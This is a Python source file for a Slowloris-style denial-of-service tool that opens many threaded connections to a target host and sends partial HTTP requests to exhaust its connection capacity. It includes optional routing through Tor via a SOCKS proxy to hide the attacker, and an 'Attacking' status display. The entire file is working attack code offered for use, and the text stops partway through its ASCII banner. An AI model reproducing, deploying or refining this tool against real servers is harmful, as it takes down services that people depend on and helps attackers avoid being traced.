#!/usr/bin/env python3

import sys
import socks
import socket
import time
import signal
import threading
import argparse

args = None

def slowloris():
    while True:
        url = args.host
        hostport = url.split(':')
        host = hostport[0]
        port = int(hostport[1]) if len(hostport) == 2 else 80

        print_target(host, port)
        print_status()
        start_attack_thread(host, port)

def start_attack_thread(host, port):
    i = 0
    while i < args.threads:
        try:
            thread = threading.Thread(target=setup_attack, args=[host, port])
            thread.daemon = True
            thread.start()
            i += 1
        except:
            pass

def setup_attack(host, port):
    while True:
        sockets = []
        tries_failed = 0

        while True:
            sock = None

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if args.tor:
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, args.sockshost, args.socksport)
                    socket.socket = socks.socksocket
            except:
                continue

            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

            sock.settimeout(5)
            sockets.append(sock)

            if not send_payload(sock, host, port):
                tries_failed += 1

            if tries_failed > 5:
                break

        time.sleep(args.keepalive)
        disconnect_sockets(sockets)

def send_payload(sock, host, port):
    random = int(time.time() * 1000) % 10000
    method = 'POST' if random % 2 == 0 else 'GET'
    payload = ('%s /?%i HTTP/1.1\r\n'
        'Host: %s\r\n'
        'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\r\n'
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n'
        'Connection: Keep-Alive\r\n'
        'Keep-Alive: timeout=%i\r\n'
        'Content-Length: 42\r\n') % (method, random, host, args.keepalive)

    try:
        args.tor and sock.get_proxy_sockname()
        sock.connect((host, port))
        sock.sendall(payload.encode('utf-8'))
    except (AttributeError, socks.ProxyConnectionError):
        print_status('waiting for TOR...')
        return True
    except Exception as e:
        send_payload.amount_failed += 1
        print_status()
        return False

    send_payload.amount_success += 1
    print_status()
    return True

send_payload.amount_success = 0
send_payload.amount_failed  = 0

def print_target(host, port):
    str_target = 'Attacking \033[1m%s:%i\033[0m' % (host, port)
    print(str_target)

def print_status(str_extra=None):
    str_success = '\033[92mPayloads successful: %i' % send_payload.amount_success
    str_and = '\033[90m, '
    str_failed = '\033[91mPayloads failed: %i' % send_payload.amount_failed
    str_extra = ('\033[0m, ' + str_extra if str_extra else '')

    print(str_success + str_and + str_failed + str_extra + '\033[0m', end='\r')
    sys.stdout.write("\033[K")

def disconnect_sockets(sockets):
    for sock in sockets:
        try:
            sock.shutdown(socket.SHUT_RDWR)
        except:
            pass
        finally:
            sock.close()

def interruptable_event():
    e = threading.Event()

    def patched_wait():
        while not e.is_set():
            e._wait(3)

    e._wait = e.wait
    e.wait = patched_wait
    return e

def signal_handler(signal, frame):
    print_status(':)\n')
    sys.exit(0)

if __name__ == '__main__':
    print("\033[94m")
    print(r"______ _    _ _   _  _     ___________ _____ _____")
    print(r"| ___ \ |  | | \ | || |   |  _  | ___ \_   _/  ___|")
    print(r"| |_/ / |  | |  \| || |   | | | | |_/ / | | \ `--. ")
    print(r"|  __/| |/\| | . ` || |   | | | |    /  | |  `--. \ ")
    print(r"| |   \  /\  / |\  || |___\ \_/ / |\ \ _|
